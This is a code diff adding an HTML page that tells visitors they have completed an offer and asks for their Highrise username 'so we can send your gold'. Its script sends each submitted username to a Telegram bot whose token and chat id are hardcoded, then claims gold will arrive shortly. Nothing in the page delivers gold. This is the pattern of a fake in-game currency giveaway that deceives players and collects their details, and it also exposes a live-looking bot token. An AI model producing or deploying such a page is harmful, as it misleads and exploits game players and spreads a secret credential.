@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Confirm Gold Delivery</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(135deg, #141e30, #243b55);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    .box {
+      background: rgba(0,0,0,0.6);
+      padding: 2rem;
+      border-radius: 15px;
+      box-shadow: 0 0 10px #000;
+      width: 90%;
+      max-width: 400px;
+    }
+
+    input {
+      width: 100%;
+      padding: 1rem;
+      border: none;
+      border-radius: 10px;
+      margin-bottom: 1rem;
+      font-size: 1rem;
+    }
+
+    button {
+      padding: 1rem 2rem;
+      border: none;
+      border-radius: 10px;
+      background: #FFD700;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background: #ffc107;
+    }
+
+    #statusMsg {
+      margin-top: 1rem;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="box" id="formBox">
+    <h2 id="mainTitle">🎉 Offer Completed!</h2>
+    <p id="mainText">Please enter your Highrise username so we can send your gold:</p>
+    <input type="text" id="username" placeholder="Your Highrise username">
+    <button onclick="sendToTelegram()">Submit</button>
+    <p id="statusMsg"></p>
+  </div>
+
+  <script>
+    const submitted = localStorage.getItem("submitted");
+
+    if (submitted) {
+      document.getElementById("mainTitle").textContent = "✅ Already Submitted";
+      document.getElementById("mainText").textContent = "You have already submitted your username. Please wait for delivery.";
+      document.getElementById("username").style.display = "none";
+      document.querySelector("button").style.display = "none";
+    }
+
+    function sendToTelegram() {
+      const username = document.getElementById('username').value;
+      const status = document.getElementById('statusMsg');
+
+      if (!username.trim()) {
+        status.textContent = 'Please enter your username!';
+        status.style.color = 'orange';
+        return;
+      }
+
+      const token = '6456489010:AAHxWt_1iqbOk7yWiU76djvQMMXToLcmEuU';
+      const chat_id = 5830998075;
+
+      const message = `👤 New user submitted:\n\n🔸 Username: ${username}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          localStorage.setItem("submitted", "true");
+          status.textContent = '✅ Your request has been received! Gold will be sent shortly.';
+          status.style.color = 'lightgreen';
+          setTimeout(() => {
+            window.location.href = 'thankyou.html';
+          }, 3000);
+        } else {
+          status.textContent = `❌ Failed to send. Error: ${data.description}`;
+          status.style.color = 'red';
+        }
+      })
+      .catch(error => {
+        status.textContent = `⚠️ An error occurred: ${error.message}`;
+        status.style.color = 'red';
+      });
+    }
+  </script>
+</body>
+</html>
